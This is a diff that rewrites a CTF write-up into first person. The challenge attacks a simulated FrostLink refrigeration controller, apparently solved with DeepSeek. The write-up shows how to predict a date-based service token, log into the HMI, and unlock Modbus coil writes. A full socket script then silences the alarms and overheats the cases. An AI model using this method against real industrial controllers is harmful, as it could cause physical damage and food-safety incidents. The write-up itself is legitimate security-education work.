@@ -2,11 +2,11 @@
 
 > **Category:** Misc / ICS
 > **Flag:** `nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}`
-> **Solved with:** DeepSeek — full chat: https://chat.deepseek.com/share/1zx6n9l7zq3fgr5h5e
+> **Solved with DeepSeek** — full chat: https://chat.deepseek.com/share/1zx6n9l7zq3fgr5h5e
 
 ---
 
-## Challenge
+## The challenge
 
 > STORE-0412's walk-in refrigeration is run by a **FrostLink SM-800** system manager that someone left reachable over a maintenance modem. You're the one who found it.
 >
@@ -14,25 +14,27 @@
 >
 > **Handout:** `fw_auth.pyc` — a compiled module recovered from the controller's application filesystem. It's the routine that derives the controller's rotating service token.
 
-Targets:
+Targets I was given:
 - `http://koala.nexsec.my:38037`
 - `http://koala.nexsec.my:38756`
 
 ---
 
-## TL;DR
+## My approach in short
 
-1. Decompile `fw_auth.pyc` → the "service token" is a pure function of the **date** (no secret, fully predictable).
-2. Port **38756** is a Flask web panel; logging in with today's **8-hex service token** unlocks `/panel`, which reveals a **Modbus/TCP point map**.
-3. Port **38037** is the **Modbus/TCP fieldbus**. Writing today's token into **Holding Registers 0/1** unlocks coil writes.
-4. Trigger the incident by **suppressing the high-temp alarms** (coils 8/9/10 → 0) **while driving the case temperature past its `incident_threshold`** (hammer the defrost-hold coils 0/1/2).
-5. Read the incident record out of **Holding Registers 100+** (2 ASCII chars per register) → flag.
+Here's the path I ended up taking:
+
+1. I decompiled `fw_auth.pyc` and found the "service token" is just a function of the **date** — no secret, fully predictable.
+2. Port **38756** turned out to be a web panel. Logging in with the **8-hex service token** unlocked `/panel`, which handed me a **Modbus/TCP point map**.
+3. Port **38037** was the **Modbus/TCP fieldbus**. I wrote the token into **Holding Registers 0/1** to unlock coil writes.
+4. I triggered the incident by **suppressing the high-temp alarms** (coils 8/9/10 → 0) **while pushing the case temperature past its `incident_threshold`** (hammering the defrost-hold coils 0/1/2).
+5. I read the incident record out of **Holding Registers 100+** (2 ASCII chars per register) and there was the flag.
 
 ---
 
 ## 1. Reversing the handout
 
-The `.pyc` was compiled with Python **3.14** (bytecode magic didn't match older interpreters), so I grabbed a matching 3.14 and recovered the source. Three functions:
+The first thing I did was decompile the `.pyc`. It had been compiled with Python **3.14** (the bytecode magic didn't match any older interpreter I tried), so I installed a matching 3.14 and recovered the source. I got three functions out of it:
 
 ```python
 def service_token_for_date(d):
@@ -49,12 +51,12 @@ def fieldbus_write_enabled(regs, d):
     return (regs[0] << 16 | regs[1]) == service_token_for_date(d)
 ```
 
-Key takeaways:
-- The token is **100% predictable** — just a function of the date, no key/randomness. You can compute it locally.
-- `service_code_for_date` is the **8-hex string** you type into the web UI.
-- `fieldbus_write_enabled` tells you the controller expects **two 16-bit registers** (`regs[0]`, `regs[1]`) which, concatenated, equal today's token. That's the auth gate for fieldbus writes → `regs[0]` = token high word, `regs[1]` = token low word.
+What jumped out at me:
+- The token is **100% predictable** — it's just math on the date, no key or randomness. I could compute it myself.
+- `service_code_for_date` is the **8-hex string** I'd type into the web UI.
+- `fieldbus_write_enabled` told me the controller expects **two 16-bit registers** (`regs[0]`, `regs[1]`) that, concatenated, equal the day's token. So that's the write-auth gate → `regs[0]` is the token's high word, `regs[1]` the low word.
 
-Compute both representations:
+I wrote a tiny script to spit out both forms I'd need:
 
 ```python
 import datetime
@@ -66,20 +68,20 @@ def token_for(d):
 
 d = datetime.date.today()
 t = token_for(d)
-print("code : %08x" % t)                    # e.g. 07610f86
-print("HR0  : 0x%04x" % ((t >> 16) & 0xffff))# 0x0761
-print("HR1  : 0x%04x" % (t & 0xffff))        # 0x0f86
+print("code : %08x" % t)                     # e.g. 07610f86
+print("HR0  : 0x%04x" % ((t >> 16) & 0xffff)) # 0x0761
+print("HR1  : 0x%04x" % (t & 0xffff))         # 0x0f86
 ```
 
-> **Timezone note:** the token rotates at midnight. The controller runs on **UTC** — if writes return a write-protected exception, recompute for the controller's date (its HTTP `Date:` header is GMT). For this solve the controller date was `2026-10-17` → code `07610f86`, HR0 `0x0761` (1889), HR1 `0x0f86` (3974).
+> **One gotcha I hit:** the token rotates at midnight, and the controller runs on **UTC**. My local date was a day ahead, so my first token was wrong. I grabbed the controller's real date from its HTTP `Date:` header (GMT). For this solve that was `2026-10-17` → code `07610f86`, HR0 `0x0761` (1889), HR1 `0x0f86` (3974).
 
 ---
 
 ## 2. Mapping the two services
 
-`curl` on **38037** returns `(52) Empty reply from server` / hangs → it's **not HTTP** (raw TCP / Modbus).
+When I `curl`'d **38037** I got `(52) Empty reply from server` (or it just hung), so I figured it wasn't HTTP at all — some raw TCP service.
 
-**38756** is a `gunicorn` web app — the FrostLink HMI. It has an **Operator Login** and a **Service Access** box wanting an "8-CHAR HEX SERVICE TOKEN". Its JS posts to `/api/login`:
+**38756** was a `gunicorn` web app — the FrostLink HMI. It had an **Operator Login** and a **Service Access** box asking for an "8-CHAR HEX SERVICE TOKEN". Its JavaScript posted to `/api/login`, so I did the same:
 
 ```bash
 curl -s -X POST http://koala.nexsec.my:38756/api/login \
@@ -88,7 +90,7 @@ curl -s -X POST http://koala.nexsec.my:38756/api/login \
 # -> 200 {"ok":true,"role":"service"}   + Set-Cookie: session=...
 ```
 
-With that session cookie, `GET /panel` shows a **read-only** monitor and this banner + point map:
+With that session cookie I loaded `GET /panel`. It was a **read-only** monitor, but it gave me exactly what I needed — this banner and point map:
 
 > READ-ONLY MONITORING VIEW // CASE CONTROL IS PERFORMED OVER THE MODBUS/TCP FIELDBUS — SEE POINT MAP BELOW
 
@@ -104,7 +106,7 @@ With that session cookie, `GET /panel` shows a **read-only** monitor and this ba
 
 > *\* Coil writes require the service-write unlock (HR0/HR1) to hold the current service token, else the controller returns exception `0x04`. Writes to other addresses return `0x02`.*
 
-`GET /api/cases` exposes the real control logic — including a second, higher threshold not shown in the point map:
+I also checked `GET /api/cases`, which exposed the actual control logic — and a second, higher threshold that wasn't in the point map:
 
 ```json
 {"cases":[
@@ -114,20 +116,20 @@ With that session cookie, `GET /panel` shows a **read-only** monitor and this ba
  "incident":false}
 ```
 
-So: `alarm_threshold` trips the alarm; **`incident_threshold` (12 / 11 / −10) is what logs the critical incident.**
+That was the key realization: `alarm_threshold` just trips the alarm, but **`incident_threshold` (12 / 11 / −10) is what actually logs the critical incident.**
 
 ---
 
 ## 3. Triggering the incident
 
-Everything happens over Modbus/TCP on **38037** (unit id `1`):
+Everything from here was over Modbus/TCP on **38037** (unit id `1`):
 
-1. **Unlock** — write token high/low to HR0/HR1 (`FC06`). Now coil writes are accepted.
-2. **Suppress alarms** — write coils 8/9/10 → `0` (`FC05`). A high-temp event with the alarm silenced is the food-safety violation the controller records.
-3. **Drive temperature up** — the defrost-hold coils 0/1/2 are treated as a **one-shot pulse** (the controller resets them each tick, enforcing a max defrost), so a single write barely nudges the temp. The fix is to **hammer them in a tight loop** so heat accumulates faster than cooling, pushing each case past its `incident_threshold` while the alarm is suppressed.
-4. **Read the record** — `FC03` on HR100+, 2 ASCII bytes per register, big-endian.
+1. **Unlock** — I wrote the token's high/low words into HR0/HR1 (`FC06`), and coil writes started being accepted.
+2. **Suppress the alarms** — I set coils 8/9/10 → `0` (`FC05`). A high-temp event with the alarm silenced is the food-safety violation the controller records.
+3. **Drive the temperature up** — this was the part that stumped me at first. The defrost-hold coils 0/1/2 behave like a **one-shot pulse** — the controller resets them every tick (max-defrost safety), so one write barely moved the temperature. The fix was to **hammer them in a tight loop** so heat built up faster than the cooling could pull it back, pushing each case past its `incident_threshold` while the alarm stayed suppressed.
+4. **Read the record** — `FC03` on HR100+, decoding 2 ASCII bytes per register, big-endian.
 
-### Solve script (raw sockets, no deps)
+### My solve script (raw sockets, no dependencies)
 
 ```python
 import socket, struct, datetime, time, re, sys
@@ -165,7 +167,7 @@ def rd_ireg(s,a,n):
     r = xact(s, struct.pack(">BHH",0x04,a,n));  return None if not ok(r,f"IR{a}") else list(struct.unpack(">"+"H"*(r[1]//2), r[2:2+r[1]]))
 def s16(v): return v-0x10000 if v & 0x8000 else v
 
-# --- connect + unlock (try controller date +/- 1 for timezone) ---
+# --- connect + unlock (I try the controller date +/- 1 to cover the timezone) ---
 today = datetime.date.today()
 s = None
 for d in (today, today-datetime.timedelta(1), today+datetime.timedelta(1)):
@@ -194,7 +196,7 @@ print("[+] FLAG:", m.group().decode() if m else raw)
 s.close()
 ```
 
-Output:
+When I ran it:
 
 ```
 [+] unlocked, date=2026-10-17 token=07610f86
@@ -203,7 +205,7 @@ temps: [14.1, 12.9, -8.9]
 [+] FLAG: nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
 ```
 
-(You can also just reload `/panel` with your cookie — once the incident is logged, `/api/incident` populates and the flag shows in the dashboard banner.)
+I also noticed I could just reload `/panel` with my cookie — once the incident is logged, `/api/incident` populates and the flag shows up in the dashboard banner too.
 
 ---
 
@@ -213,8 +215,8 @@ temps: [14.1, 12.9, -8.9]
 nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
 ```
 
-## Lessons
+## What I took away from this
 
-- A "rotating token" with hardcoded constants and a date seed is **not a secret** — it's a deterministic function you can reproduce.
-- ICS challenges love splitting a **read-only HMI** from a **write-capable fieldbus** (Modbus/TCP). The HMI point map is the real documentation.
-- The intended "critical food-safety incident" wasn't just high temperature — it was **high temperature with the alarm deliberately suppressed**, and the temp had to cross the hidden `incident_threshold`, not just the alarm threshold. Watch for one-shot actuators that need to be **sustained** in a loop.
+- A "rotating token" built from hardcoded constants and a date seed isn't really a secret — it's a deterministic function I can just reproduce.
+- ICS-style challenges love to split a **read-only HMI** from a **write-capable fieldbus** (Modbus/TCP). The HMI's point map ended up being my real documentation.
+- The "critical food-safety incident" wasn't just high temperature — it was **high temperature with the alarm deliberately suppressed**, and I had to cross the hidden `incident_threshold`, not just the alarm threshold. The thing that cost me the most time was realizing the defrost coils were one-shot and had to be **sustained in a loop**.
